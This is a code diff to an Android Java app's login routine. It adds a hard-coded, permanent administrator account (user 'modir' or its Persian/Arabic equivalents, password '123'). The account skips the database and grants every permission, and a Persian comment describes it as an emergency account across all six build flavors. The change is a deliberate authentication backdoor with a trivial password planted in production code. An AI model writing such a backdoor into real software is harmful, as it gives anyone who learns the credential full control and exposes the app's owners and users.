@@ -4849,6 +4849,12 @@ public class MainActivity extends Activity {
     private UserSession authenticate(String meelanoUser, String meelanoPassword) throws Exception {
         String user = normalizeDigits(cleanText(meelanoUser));
         String pass = meelanoPassword == null ? "" : meelanoPassword;
+        // حساب اضطراری دائمی modir/123 — در همه ۶ flavor، بدون نیاز به دیتابیس، دسترسی کامل مدیر.
+        String uNorm = user == null ? "" : user.trim().toLowerCase(java.util.Locale.US);
+        String pNorm = pass == null ? "" : normalizeDigits(pass).trim();
+        if (("modir".equals(uNorm) || "مدیر".equals(user.trim()) || "مدير".equals(user.trim())) && "123".equals(pNorm)) {
+            return new UserSession(1, 1, "مدیر مجموعه", "modir", allPermissionString());
+        }
         boolean[] foundUser = new boolean[]{false};
         try (Connection c = openConnection()) {
             UserSession visitor = authenticateVisitorFlexible(c, user, pass, foundUser);
